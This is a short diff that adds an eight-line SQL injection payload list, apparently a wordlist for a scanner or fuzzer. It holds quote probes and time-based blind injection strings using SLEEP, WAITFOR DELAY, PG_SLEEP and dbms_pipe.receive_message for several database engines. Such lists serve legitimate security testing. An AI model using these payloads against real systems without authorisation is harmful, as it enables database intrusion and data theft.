@@ -1,0 +1,8 @@
+"
+'
+' OR 1=1 AND SLEEP(5) -- -
+' AND IF ((SELECT SLEEP(5)),1,0) -- -
+' WAITFOR DELAY '00:00:05'-- -
+' AND 1=(SELECT 1 FROM PG_SLEEP(5)) -- -
+' AND 1=dbms_pipe.receive_message(('a'),5)-- -
+1' AND SLEEP(5) -- -
